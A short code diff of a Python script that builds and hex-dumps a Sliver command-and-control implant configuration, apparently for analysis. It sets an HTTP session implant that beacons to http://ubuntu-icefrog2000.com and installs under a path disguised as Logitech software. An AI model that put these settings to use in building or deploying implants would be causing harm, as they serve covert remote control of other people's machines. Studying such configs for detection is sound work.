@@ -67,6 +67,8 @@ config.EncoderNonce = 13
 config.MaxFailure = 5
 config.ReconnectInterval = 600
 config.SliverPath = "%APPDATA%\\Logitech"
+
+# SESSION HTTP
 config.Protocol = config_pb2.ProtocolType.HTTP
 config.Type = config_pb2.ImplantType.Session
 http_config = config.HttpConfigs.add()
@@ -103,6 +105,6 @@ http_config.PollInterval = 3
 http_config.UseStandardPort = True
 http_config.URL = "http://ubuntu-icefrog2000.com"
 
-print(config.Protocol)
 marshaled_data = config.SerializeToString()
+
 hexdump(marshaled_data)
